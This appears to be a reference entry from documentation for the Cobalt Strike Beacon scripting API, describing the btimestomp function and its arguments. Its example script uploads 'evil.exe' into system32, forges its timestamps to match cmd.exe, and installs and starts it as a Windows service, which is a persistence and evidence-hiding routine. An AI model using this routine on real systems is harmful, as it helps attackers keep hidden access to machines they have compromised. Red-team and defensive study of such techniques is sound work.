btimestomp

Ask Beacon to change the file modified/accessed/created times to match another file.

#### Arguments

`$1` - the id for the beacon. This may be an array or a single ID.

`$2` - the file to update timestamp values for

`$3` - the file to grab timestamp values from

#### Example

```
alias persist {
   bcd($1, "c:\\windows\\system32");
   bupload($1, script_resource("evil.exe"));
   btimestomp($1, "evil.exe", "cmd.exe");
   bshell($1, 'sc create evil binpath= "c:\\windows\\system32\\evil.exe"');
   bshell($1, 'sc start evil');
}```

